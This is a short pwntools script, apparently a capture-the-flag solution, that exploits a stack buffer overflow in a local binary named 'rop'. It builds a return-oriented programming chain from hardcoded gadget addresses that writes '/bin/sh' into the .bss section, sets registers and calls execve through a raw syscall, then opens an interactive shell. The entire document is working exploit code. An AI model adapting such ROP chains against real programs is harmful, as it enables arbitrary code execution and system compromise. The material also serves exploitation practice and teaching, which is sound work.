from pwn import *

context.arch = 'amd64'
r = process('./rop')

pop_rdi = 0x400686
pop_rsi = 0x4100f3
pop_rdx = 0x449935
mov_rdi_rsi = 0x44709b  # put the value of rsi into the addr referred by rdi
pop_rdx_rsi = 0x44beb9
pop_rax = 0x415714
syscall = 0x474ee5

# section to write /bin/sh
bss = 0x6b6020

p = 'a' * 0x38
p += p64(pop_rdi)
p += p64(bss)

# now we can write string to the section
p += p64(pop_rsi)
p += "/bin/sh\0"

# put /bin/sh into the address by rdi
p += p64(mov_rdi_rsi)

# rdx rsi need to be 0
p += p64(pop_rdx_rsi)
p += p64(0)
p += p64(0)

p += p64(pop_rax)
p += p64(0x3b)
p += p64(syscall)

r.sendlineafter(":D", p)
r.interactive()